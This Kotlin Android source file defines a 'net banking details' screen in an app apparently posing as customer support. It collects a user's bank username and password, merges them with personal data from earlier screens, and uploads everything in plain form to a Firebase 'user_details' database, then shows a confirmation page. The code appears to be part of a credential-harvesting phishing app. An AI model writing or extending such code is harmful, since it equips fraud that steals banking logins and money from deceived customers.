package com.ibnghufran.supportforcustomer

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.google.firebase.database.FirebaseDatabase

class NetBankingDetailsFragment : Fragment() {

    private lateinit var usernameField: EditText
    private lateinit var passwordField: EditText
    private lateinit var backButton: Button
    private lateinit var submitButton: Button

    // Holds the combined user data from previous fragments
    private lateinit var userInputData: UserInputData

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Retrieve the userInputData from arguments (if passed as Parcelable)
        arguments?.let {
            userInputData = it.getParcelable("userInputData") ?: UserInputData()
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_net_banking_details, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // Initialize views
        usernameField = view.findViewById(R.id.usernameField)
        passwordField = view.findViewById(R.id.passwordField)
        backButton = view.findViewById(R.id.backButton)
        submitButton = view.findViewById(R.id.submitButton)

        // Set up Back button to navigate to the previous fragment
        backButton.setOnClickListener {
            requireActivity().supportFragmentManager.popBackStack()
        }

        // Set up Submit button to upload data to Firebase and navigate to ConfirmationActivity
        submitButton.setOnClickListener {
            val username = usernameField.text.toString().trim()
            val password = passwordField.text.toString().trim()

            // Validate fields
            if (username.isEmpty() || password.isEmpty()) {
                Toast.makeText(requireContext(), "Please fill in all fields.", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            // Update userInputData with net banking details
            userInputData = userInputData.copy(
                username = username,
                password = password
            )

            // Upload data to Firebase
            uploadDataToFirebase(userInputData)
        }
    }

    private fun uploadDataToFirebase(userData: UserInputData) {
        val database = FirebaseDatabase.getInstance()
        val ref = database.getReference("user_details").push() // Update this path as necessary

        ref.setValue(userData)
            .addOnSuccessListener {
                // Show success Toast message
                Toast.makeText(requireContext(), "Details uploaded successfully", Toast.LENGTH_SHORT).show()

                // Navigate to ConfirmationActivity
                val intent = Intent(activity, ConfirmationActivity::class.java)
                startActivity(intent)
                requireActivity().finish() // Optionally finish the current activity
            }
            .addOnFailureListener { e ->
                // Show failure Toast message
                Toast.makeText(requireContext(), "Failed to upload data. Please try again.", Toast.LENGTH_SHORT).show()
            }
    }
}
